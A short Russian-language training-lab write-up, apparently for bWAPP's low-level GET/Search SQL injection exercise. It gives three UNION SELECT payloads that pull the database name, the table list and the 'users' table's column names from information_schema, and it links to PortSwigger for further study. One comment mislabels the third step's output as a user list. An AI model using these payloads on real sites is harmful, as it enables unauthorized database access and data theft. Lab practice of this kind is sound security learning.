**SQL Injection (GET/Search)** - **(low)**

Используем строку
```bash
asd\' UNION SELECT NULL,database(),NULL,NULL,NULL,NULL,NULL\-- -
```
чтобы вывести название базы

теперь используем строку
```bash
asd\' UNION SELECT NULL,table_name,NULL,NULL,NULL,NULL,NULL from
information_schema.tables where table_schema=database()\-- -
```
чтобы узнать, какие в базе есть такблицы

на интересует users, поэтому используем следующую строку
```bash
asd\' UNION SELECT NULL,column_name,NULL,NULL,NULL,NULL,NULL from
information_schema.columns where table_name=\'users\'\-- -
```
чтобы получить список пользователей

в таком темпе можно продолжать пока не получим интересующую информацию

![Рисунок 1](./images/media/image1.png)

### См. также
подробнее ознакомиться с этой темой советую тут: &lt;https://portswigger.net/web-security/sql-injection#what-is-sql-injection-sqli&gt;